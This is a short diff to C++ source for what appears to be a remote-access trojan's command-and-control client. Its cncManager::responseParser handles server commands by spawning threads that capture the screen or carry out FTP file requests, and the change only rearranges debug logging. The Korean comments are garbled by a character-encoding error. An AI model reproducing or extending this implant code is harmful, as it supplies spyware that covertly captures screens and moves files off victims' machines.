@@ -218,13 +218,14 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 case ftpRequest:
                 {
                     /* 胶鸡 夸没 贸府 */
-                    this->printParsedResponse(resData, "FTP_REQUEST");
                     if (!data.compare("screenshot")) {
+                        this->printParsedResponse(resData, "SCREENSHOT_REQUEST");
                         std::thread screenHandler = std::thread(&cncManager::handleScreenRequest, this);
                         screenHandler.detach();
                     }
                     /* 颇老 夸没 贸府 */
                     else {
+                        this->printParsedResponse(resData, "FTP_REQUEST");
                         std::thread ftpHandler = std::thread(&cncManager::handleFtpRequest, this,data);
                         ftpHandler.detach();
                     }
